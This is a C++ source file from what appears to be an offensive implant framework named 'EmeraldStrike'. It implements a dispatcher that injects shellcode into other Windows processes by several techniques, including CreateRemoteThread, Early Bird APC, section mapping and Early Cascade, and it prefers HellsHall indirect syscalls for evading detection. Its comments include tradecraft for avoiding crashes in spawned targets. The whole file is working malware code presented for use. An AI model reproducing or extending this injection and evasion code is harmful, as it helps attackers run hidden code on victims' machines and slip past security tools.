// EmeraldStrike - Injection dispatcher
// Each technique lives in its own translation unit (injection_<tech>.cc)
// so they can be reviewed, forked, and extended independently:
//   injection_crt.cc       INJECT_CRT      CreateRemoteThread
//   injection_apc.cc       INJECT_APC      Early Bird APC
//   injection_section.cc   INJECT_SECTION  NtCreateSection dual view
//   injection_cascade.cc   INJECT_CASCADE  Early Cascade shim-callback
//   injection_custom.cc    INJECT_CUSTOM   operator-defined scaffold
//   injection_hellshall.cc (always compiled under INCLUDE_EVASION_HELLSHALL,
//                          preferred at dispatch over the compiled technique)
// This file only selects the technique and owns the pid->handle plumbing.
#include "evasion/injection.h"
#include "common.h"
#include "config.h"

HANDLE inject_shellcode_into(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread, BYTE* shellcode, DWORD sc_len, DWORD* step) {
#ifdef INCLUDE_EVASION_HELLSHALL
    // HellsHall for inject-into-pid (no initial thread): preferred when
    // available — indirect syscalls, CFG-safe thread creation via APC.
    // NOT for spawn (hInitialThread != NULL): the child's main thread is
    // still suspended at LdrInitializeThunk, and creating a second thread
    // via NtCreateThreadEx triggers parallel loader init that races with
    // the incomplete main-thread init, corrupting CFG bitmap state
    // (dump-verified: 0xC0000409 in localspl.dll/gpsvc.dll DllMain).
    // Spawn uses the compile-time technique (cascade/crt/apc) instead —
    // cascade is designed for exactly this case (shim-callback APC on the
    // main thread, so the loader completes normally).
    if (!hInitialThread && inst->bHellsHallInit)
        return inject_hellshall(inst, hProcess, shellcode, sc_len, step, FALSE);
#endif

#if INJECTION_TECHNIQUE == INJECT_CRT
    (void)hInitialThread;
    return inject_crt(inst, hProcess, shellcode, sc_len, step);
#elif INJECTION_TECHNIQUE == INJECT_APC
    (void)hInitialThread;
    return inject_apc(inst, hProcess, shellcode, sc_len, step);
#elif INJECTION_TECHNIQUE == INJECT_SECTION
    (void)hInitialThread;
    return inject_section(inst, hProcess, shellcode, sc_len, step);
#elif INJECTION_TECHNIQUE == INJECT_CUSTOM
    (void)hInitialThread;
    return inject_custom(inst, hProcess, shellcode, sc_len, step);
#elif INJECTION_TECHNIQUE == INJECT_CASCADE
    return inject_cascade(inst, hProcess, hInitialThread, shellcode, sc_len, step);
#else
    (void)hInitialThread;
    return inject_crt(inst, hProcess, shellcode, sc_len, step);
#endif
}

BOOL inject_shellcode(PINSTANCE inst, DWORD pid, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    if (step) *step = 1;
    HANDLE hProc = gate_OpenProcess(inst, PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    if (step) *step = 2;
    HANDLE hThread = inject_shellcode_into(inst, hProc, NULL, shellcode, sc_len, step);
    BOOL result = (hThread != NULL);

    if (hThread) gate_CloseHandle(inst, hThread);
    gate_CloseHandle(inst, hProc);
    return result;
}
